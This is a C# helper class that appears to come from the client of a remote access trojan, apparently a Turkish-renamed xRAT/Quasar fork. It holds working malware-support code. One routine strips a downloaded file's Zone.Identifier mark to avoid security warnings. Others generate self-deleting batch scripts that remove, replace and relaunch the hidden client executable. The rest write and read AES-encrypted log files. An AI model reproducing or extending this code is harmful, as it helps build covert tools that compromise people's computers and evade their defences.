using System;
using System.IO;
using System.Text;
using xClient.KuuhakuÇekirdek.Kriptografi;
using xClient.KuuhakuÇekirdek.Veri;
using xClient.KuuhakuÇekirdek.Utilityler;

namespace xClient.KuuhakuÇekirdek.Yardımcılar
{
    public static class DosyaYardımcısı
    {
        private const string Karakterler = "ABCÇDEFGĞHIİJKLMNOPQRSŞTUVWXYZabcçdefgğhiıjklmnopqrsştuvwxyz0123456789";
        private static readonly Random Rng = new Random(Environment.TickCount);
        public static string RastgeleDosyaİsmi(int length, string extension = "")
        {
            StringBuilder randomName = new StringBuilder(length);
            for (int i = 0; i < length; i++)
                randomName.Append(Karakterler[Rng.Next(Karakterler.Length)]);

            return string.Concat(randomName.ToString(), extension);
        }

        public static string TempDosyaDizininiAl(string extension)
        {
            while (true)
            {
                string tempFilePath = Path.Combine(Path.GetTempPath(), RastgeleDosyaİsmi(12, extension));
                if (File.Exists(tempFilePath)) continue;
                return tempFilePath;
            }
        }

        public static bool ExeValidmiKardeş(byte[] block)
        {
            if (block.Length < 2) return false;
            return (block[0] == 'M' && block[1] == 'Z') || (block[0] == 'Z' && block[1] == 'M');
        }

        public static bool DeleteZoneIdentifier(string filePath)
        {
            return NativeMethods.DeleteFile(filePath + ":Zone.Identifier");
        }

        public static string KaldırmaBatı(bool isFileHidden)
        {
            try
            {
                string batchFile = TempDosyaDizininiAl(".bat");

                string uninstallBatch = (isFileHidden)
                    ? "@echo off" + "\n" +
                      "echo BU EKRANI KAPATMA" + "\n" +
                      "ping -n 10 localhost > nul" + "\n" +
                      "del /A:H " + "\"" + ClientVerisi.CurrentPath + "\"" + "\n" +
                      "del " + "\"" + batchFile + "\""
                    : "@echo off" + "\n" +
                      "echo BU EKRANI KAPATMA" + "\n" +
                      "ping -n 10 localhost > nul" + "\n" +
                      "del " + "\"" + ClientVerisi.CurrentPath + "\"" + "\n" +
                      "del " + "\"" + batchFile + "\""
                    ;

                File.WriteAllText(batchFile, uninstallBatch);
                return batchFile;
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }

        public static string GüncellemeBatı(string newFilePath, bool isFileHidden)
        {
            try
            {
                string batchFile = TempDosyaDizininiAl(".bat");

                string uninstallBatch = (isFileHidden)
                    ? "@echo off" + "\n" +
                      "echo BU EKRANI KAPATMA!" + "\n" +
                      "ping -n 10 localhost > nul" + "\n" +
                      "del /A:H " + "\"" + ClientVerisi.CurrentPath + "\"" + "\n" +
                      "move " + "\"" + newFilePath + "\"" + " " + "\"" + ClientVerisi.CurrentPath + "\"" + "\n" +
                      "start \"\" " + "\"" + ClientVerisi.CurrentPath + "\"" + "\n" +
                      "del " + "\"" + batchFile + "\""
                    : "@echo off" + "\n" +
                      "echo BU EKRANI KAPATMA!" + "\n" +
                      "ping -n 10 localhost > nul" + "\n" +
                      "del " + "\"" + ClientVerisi.CurrentPath + "\"" + "\n" +
                      "move " + "\"" + newFilePath + "\"" + " " + "\"" + ClientVerisi.CurrentPath + "\"" + "\n" +
                      "start \"\" " + "\"" + ClientVerisi.CurrentPath + "\"" + "\n" +
                      "del " + "\"" + batchFile + "\""
                    ;

                File.WriteAllText(batchFile, uninstallBatch);
                return batchFile;
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }

        public static string YenidenBaşlatmaBatı()
        {
            try
            {
                string batchFile = TempDosyaDizininiAl(".bat");

                string uninstallBatch =
                    "@echo off" + "\n" +
                    "echo BU EKRANI KAPATMA!" + "\n" +
                    "ping -n 10 localhost > nul" + "\n" +
                    "start \"\" " + "\"" + ClientVerisi.CurrentPath + "\"" + "\n" +
                    "del " + "\"" + batchFile + "\"";

                File.WriteAllText(batchFile, uninstallBatch);

                return batchFile;
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }

        public static bool OkunabilirTemizle(string filePath)
        {
            try
            {
                FileInfo fi = new FileInfo(filePath);
                if (!fi.Exists) return false;
                if (fi.IsReadOnly)
                    fi.IsReadOnly = false;
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static void LogDosyasıYaz(string filename, string appendText)
        {
            appendText = LogDosyasıOku(filename) + appendText;

            using (FileStream fStream = File.Open(filename, FileMode.Create, FileAccess.Write))
            {
                byte[] data = AES.Encrypt(Encoding.UTF8.GetBytes(appendText));
                fStream.Seek(0, SeekOrigin.Begin);
                fStream.Write(data, 0, data.Length);
            }
        }
        public static string LogDosyasıOku(string filename)
        {
            return File.Exists(filename) ? Encoding.UTF8.GetString(AES.Decrypt(File.ReadAllBytes(filename))) : string.Empty;
        }
    }
}